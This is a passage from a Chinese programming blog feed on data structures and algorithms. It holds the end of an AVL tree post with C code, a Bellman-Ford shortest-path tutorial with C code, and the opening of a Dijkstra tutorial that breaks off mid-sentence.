class="line">    <span class="keyword">while</span> (node-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        node = node-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ElementType <span class="title function_">GetNodeMin</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (node-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        node = node-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">AVLTreeGetSize</span><span class="params">(AVLTree *tree)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> tree-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">AVLTreeIsEmpty</span><span class="params">(AVLTree *tree)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    <span class="keyword">return</span> tree-&gt;size == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rotate</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LeftRotation</span><span class="params">(AVLNode **root)</span> &#123;</span><br><span class="line">    AVLNode *node = *root;</span><br><span class="line">    AVLNode *temp = node-&gt;right;</span><br><span class="line">    <span class="comment">// rotate</span></span><br><span class="line">    node-&gt;right = temp-&gt;left;</span><br><span class="line">    temp-&gt;left = node;</span><br><span class="line">    *root = temp;</span><br><span class="line">    <span class="comment">// update height</span></span><br><span class="line">    node-&gt;height =</span><br><span class="line">            max(GetNodeHeight(node-&gt;left), GetNodeHeight(node-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    temp-&gt;height = max(GetNodeHeight(node), GetNodeHeight(temp-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RightRotation</span><span class="params">(AVLNode **root)</span> &#123;</span><br><span class="line">    AVLNode *node = *root;</span><br><span class="line">    AVLNode *temp = node-&gt;left;</span><br><span class="line">    <span class="comment">// rotate</span></span><br><span class="line">    node-&gt;left = temp-&gt;right;</span><br><span class="line">    temp-&gt;right = node;</span><br><span class="line">    *root = temp;</span><br><span class="line">    <span class="comment">// update height</span></span><br><span class="line">    node-&gt;height =</span><br><span class="line">            max(GetNodeHeight(node-&gt;left), GetNodeHeight(node-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    temp-&gt;height = max(GetNodeHeight(node), GetNodeHeight(temp-&gt;left)) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// private functions</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码<code>test.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by WAHAHA on 2023/12/10.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AVLTree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> nums[] = &#123;<span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    AVLTree *tree = AVLTreeCreate();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        AVLTreeInsert(tree, nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %d\n&quot;</span>, AVLTreeGetSize(tree));</span><br><span class="line">    <span class="keyword">while</span> (!AVLTreeIsEmpty(tree)) &#123;</span><br><span class="line">        ElementType result;</span><br><span class="line">        AVLTreeGetMin(tree, &amp;result);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, result);</span><br><span class="line">        AVLTreeDelete(tree, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    AVLTreeDestroy(tree);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size: <span class="number">10</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><br><p>参考:</p><p><a href="https://ivanzz1001.github.io/records/post/data-structure/2018/06/14/ds-avl_tree">AVL树原理及实现</a></p><p><a href="https://zh.wikipedia.org/wiki/AVL%E6%A0%91">AVL树</a></p><br><br><p>—WAHAHA 2023.12.10</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构及算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 树论 </tag>
            
            <tag> AVLTree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bellman-Ford算法</title>
      <link href="/2023-11-30-9ab73a7c6d7f/"/>
      <url>/2023-11-30-9ab73a7c6d7f/</url>
      
        <content type="html"><![CDATA[<h1 id="bellman-ford算法概述">Bellman-Ford算法概述</h1><p>此算法由<a href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E8%B2%9D%E7%88%BE%E6%9B%BC">理查德·贝尔曼</a>和<a href="https://zh.wikipedia.org/wiki/%E5%B0%8F%E8%90%8A%E6%96%AF%E7%89%B9%C2%B7%E5%80%AB%E9%81%93%E5%A4%AB%C2%B7%E7%A6%8F%E7%89%B9">小莱斯特·伦道夫·福特</a>创立,是求解<code>单源最短路径</code>问题的一种算法.其原理是对图进行<code>n-1</code>次(轮)松弛操作,其中n是图中点的个数.不断地松弛,逐渐逼近最优解,最终得到最短路径长度.</p><p>相对于<code>Dijkstra算法</code>,其优点是可以处理有<code>负边权</code>的图,并且实现简单.缺点是时间复杂度过高,高达<code>O(n*m)</code>,其中n,m分别为图的点,边数.不过,此算法可以进行若干种优化来提高效率.</p><h1 id="算法描述">算法描述</h1><h2 id="算法过程">算法过程</h2><ol><li><p>读取图的点数,边数–n,m;和起点s</p></li><li><p>初始化一个dis[]数组,其中dis[i]代表s到i的最短路径长度,除了dis[s]为0,其余设置为<code>无穷大</code></p></li><li><p>进行n-1次循环,在每次循环中遍历所有的m条边,尝试使用每条边<code>&lt;ui,vi,wi&gt;</code>松弛,即判断</p><p><code>dis[vi]&gt;dis[ui]+wi</code></p><p>是否成立,如果成立则更新dis[vi],即为所谓的<code>松弛</code>操作.</p></li><li><p>当第3步的循环结束后,dis[]中即为最终结果.</p></li></ol><h1 id="算法分析">算法分析</h1><p>参考自https://blog.csdn.net/Africa_South/article/details/90299584</p><h2 id="思想分析">思想分析</h2><p>尽管此算法和<code>Dijkstra算法</code>都基于<code>松弛</code>操作,但是与<code>Dijkstra算法</code>基于的<code>贪心思想</code>不同,此算法基于<code>动态规划</code>的思想.</p><p>首先,一个n个点的图,则所有的最短路最多只有<code>n-1</code>条边,否则如果有n条边以上的边,则说明有回路(参考最小生成树).</p><p>那么如果使用<code>d(v,k)</code>代表从源点s到点v,且最多含有k条边的最短路径长度.所以<code>d(v,n-1)</code>就是我们期望的最终状态.</p><p>Bellman-Ford算法的初始状态(k=0):</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>v</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>v</mtext><mo>=</mo><mi>s</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">∞</mi><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>v</mtext><mo mathvariant="normal">≠</mo><mi>s</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">d(v,0) = \begin{cases}    0, &amp; \text v=s \\    \infty , &amp; \text v\neq s \\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">∞</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">v</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">s</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">v</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>对1&lt;=k&lt;=n-1,有:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>v</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">{</mo><mi>d</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>k</mi><mtext>−</mtext><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>w</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo><mo>∣</mo><mi>u</mi><mtext>是</mtext><mi>v</mi><mtext>的前驱顶点</mtext><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">d(v,k)=min\{d(u,k−1)+w(u,v)∣u是v的前驱顶点\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">{</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord cjk_fallback">是</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">驱</span><span class="mord cjk_fallback">顶</span><span class="mord cjk_fallback">点</span><span class="mclose">}</span></span></span></span></span></p><p>因此要求s-&gt;v的最短路,可以先求出s-&gt;u的最短路.</p><p>根据状态转移方程,我们可以按照</p><p><code>d(*,1),d(*,2),d(*,3),...,d(*,n-1)</code></p><p>这样的顺序逐步计算.</p><h2 id="伪代码">伪代码</h2><p>用dis[v]做为s-&gt;v的最短路径.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">init dis[]:</span><br><span class="line">    dis[*] = 无穷大</span><br><span class="line">    dis[s] = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">1</span>;k &lt;= n<span class="number">-1</span>;++k)&#123;</span><br><span class="line">    <span class="keyword">for</span>((u,v,w) in 所有的边)&#123;</span><br><span class="line">        d[v] = min(d[v],d[u]+w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关键点">关键点</h2><ol><li><p>对于外层进行的n-1次循环,可以认为第i次循环结束后,dis[*]代表使用了i条边能达到的最短路径.<code>n-1</code>次循环后,代表使用<code>n-1</code>条边能够达到的最短路径.</p></li><li><p>换个角度,由于最短路至多有n-1条边,所以我们进行的每一次循环都<strong>至少</strong>确定一个点的最短路径.<code>n-1</code>次循环后,确保除了s外(它是起点),剩余的n-1个点的最短路径全部求得.</p></li></ol><p>至于第2点,<a href="https://zhuanlan.zhihu.com/p/585315996"></a>这篇文章中有较好的讲解.</p><p>第2点中的<code>至少</code>需要注意,一轮循环不一定只确定一个点的最短路径.</p><h2 id="负权边与负权环的判断">负权边与负权环的判断</h2><p>Dijkstra算法的贪心策略基于<code>深度</code>进行搜索,而Bellman-Ford算法则基于<code>广度</code>进行搜索.</p><p>因此,Bellman-Ford算法可以对<code>负权边</code>进行操作.</p><p>另一方面,由于只需要<code>n-1</code>轮松弛操作便可保证求出最短路径,那么如果发现再多进行第n轮松弛仍然可以缩短路径长度,则可以判定该图一定存在<code>负权环</code>.</p><p>注意:有负权边不代表一定有负权环.</p><h2 id="时间复杂度">时间复杂度</h2><p>由于需要进行<code>n-1</code>轮松弛,每轮都需要遍历所有的m条边,因此时间复杂度为<code>O(n*m)</code></p><h1 id="代码实现">代码实现</h1><p>本代码使用C语言,采用邻接矩阵存图.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> **graph;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">&#125; Graph;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_graph</span><span class="params">(Graph *graph)</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;graph-&gt;n, &amp;graph-&gt;m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;graph-&gt;start);</span><br><span class="line"></span><br><span class="line">    graph-&gt;graph = (<span class="type">int</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span> *) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= graph-&gt;n; ++i)</span><br><span class="line">        graph-&gt;graph[i] = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= graph-&gt;n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= graph-&gt;n; ++j) &#123;</span><br><span class="line">            graph-&gt;graph[i][j] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; graph-&gt;m; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> from, to, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;from, &amp;to, &amp;w);</span><br><span class="line">        graph-&gt;graph[from][to] = w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">bellman_ford</span><span class="params">(Graph *graph)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *dis = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; ++i)</span><br><span class="line">        dis[i] = <span class="number">0x7FFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">    dis[graph-&gt;start] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最外层循环进行n-1轮松弛操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= graph-&gt;n - <span class="number">1</span>; ++k) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= graph-&gt;n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (graph-&gt;graph[i][j] != <span class="number">0</span> &amp;&amp; dis[j] &gt; dis[i] + graph-&gt;graph[i][j]) &#123;</span><br><span class="line">                    dis[j] = dis[i] + graph-&gt;graph[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dis;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Graph graph;</span><br><span class="line">    init_graph(&amp;graph);</span><br><span class="line">    <span class="type">int</span> *dis = bellman_ford(&amp;graph);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph.n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, dis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= graph.n; ++i)</span><br><span class="line">        <span class="built_in">free</span>(graph.graph[i]);</span><br><span class="line">    <span class="built_in">free</span>(graph.graph);</span><br><span class="line">    <span class="built_in">free</span>(dis);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构及算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
            <tag> 最短路径 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dijkstra算法</title>
      <link href="/2023-11-29-ec1817b67322/"/>
      <url>/2023-11-29-ec1817b67322/</url>
      
        <content type="html"><![CDATA[<h1 id="迪杰斯特拉算法概述">迪杰斯特拉算法概述</h1><p><code>单源最短路径</code>问题,即求出一个<code>赋权图</code>的某一点s到其他任意点的<code>最短路径</code>.Dijkstra算法即为解决该问题的一种算法.该算法基于<code>贪心</code>策略,每次寻找一个距离源点s最近的点v(未被更新的),使用以v为起点的所有出边去进行<code>松弛</code>操作,逐步缩小各点到s的距离,直到所有的点都被选取完.</p><p>需要注意的是,该算法无法处理带有<code>负权边</code>的图,不过可以处理<code>带环图</code>.而且在使用堆优化,并使用邻接表进行存图的情况下,Dijkstra算法往往有着很高的效率.</p><h1 id="算法描述">算法描述</h1><h2 id="算法过程">算法过程</h2><ol><li>首先确定起点(即源点s),将所有点与起点的距离初始化为<code>无穷大</code>,一般存储在一个<code>dis[]数组</code>中,s到自己的距离(即dis[s])设置为<code>0</code>,此时dis[]即为初始状态,后续操作都是在维护这个数组.</li><li>设置一个标记数组<code>vis[]</code>,全部初始化为<code>0</code>,即一开始均未访问过.然后将vis[s]设置为<code>1</code>,即一开始从s开始访问.</li><li>不断从vis[]数组中寻找未被访问过的点<code>u</code>,同时保证每次寻找到的u满足<code>dis[u]</code>为<code>未被访问过的点</code>中最小的那一个.找到后将vis[u]设置为<code>1</code>,即代表该点已经被访问,亦即已经找到最短路径.</li><li>遍历第3步中找到的一个点u的<code>所有</code>出边&lt;u,v,w&gt;(以u为起点,v为终点,权值为w的边),尝试使用此边缩短dis[v],即如果有<code>dis[v]&gt;dis[u]+w</code>,则更新<code>dis[v]=dis[u]+w</code>.</li><li>重复第3,4步,直到vis[]数组全部置为1(即所有的点遍历完成).此时dis[i]即为s到i的最短路径.</li></ol><h2 id="过程描述">过程描述</h2><ol><li><p>dis[]数组即为最终的结果,其中任意一元素dis[i]代表从s到i的最短路径长度.</p></li><li><p>vis[]数组用于标记,其中任意一元素vis[i]为0代表该点还未被访问;为1代表已经访问.</p><p>换句话说,vis[]数组将<code>点集V</code>划分为两个集合<code>Set</code>和<code>UnSet</code>,<code>Set</code>代表已经访问过的点,<code>UnSet</code>代表未访问过的点,每访问一个点i就将其从<code>UnSet</code>中放到<code>Set</code>中,直到<code>UnSet</code>为空(或者<code>Set</code>内点数为n,即<code>Set</code>满),此时代表着算法结束.</p></li><li><p>第4步的缩短操作,这步操作即为所谓的<code>松弛</code>,不断地拉近各点到起点距离的操作.</p></li><li><p>对每一个点,尝试使用其所有出边进行<code>松弛</code>,直到所有的点(<code>从源点可达的点</code>)访问完,所有的边也就访问完.此时,<code>dis[]数组</code>中就是最终的结果.</p></li></ol><h1 id="算法分析">算法分析</h1><h2 id="思想分析">思想分析</h2><p><code>Dijkstra算法</code>和<code>SPFA</code>等算法在操作上十分相似,但是思想截然不同,将其他算法学会后会有更加深刻的认识.</p><br><p><code>Dijkstra算法</code>基于<code>贪心</code>的思想,具体体现在<code>每次选取dis[u]最小的点u</code>,即当前距离点s最近的,未访问过的点.在该点的基础上去更新其他点.</p><p>另外这一个重要的选取方法意味着:只要一个点u一旦被访问过,则其<code>dis[u]</code>一定已经是是最小的,即以后一定不会被再次更新,因为每次选择的点都是最近的点.可以这样简单证明:</p><hr><p>设有一点<code>u</code>,其<code>vis[u]==1</code>,假设其<code>dis[u]</code>不是最小的.</p><p>那么设在<code>u</code>被访问之后有一点<code>v</code>被访问到.并且点<code>u</code>有一条出边<code>&lt;v,u,w&gt;</code>指向<code>u</code>.</p><p>因为在选取u时,<code>u</code>和<code>v</code>均未被访问,则根据选择方法有<code>dis[u]&lt;dis[v]</code>.</p><p>此时遍历点<code>v</code>的出边到<code>&lt;v,u,w&gt;</code>,即检查<code>dis[u]&gt;dis[v]+w</code>是否成立,</p><p>由于<code>dis[u]&lt;dis[v]</code>,且由Dijkstra算法大前提<code>图无负权边</code>得<code>w&gt;0</code>,所以<code>dis[u]&lt;dis[v]+w</code>,进而得<code>dis[u]&gt;dis[v]+w</code>显然不成立.</p><p>这与假设不符,因此<code>dis[u]</code>是最小的.</p><p>也就是说,<code>dis[u]</code>不会被再次更新.即在此之前<code>dis[u]</code>已经为<code>s</code>到<code>u</code>的最短路径长度.</p><p>证毕.</p><hr><p>事实上,点的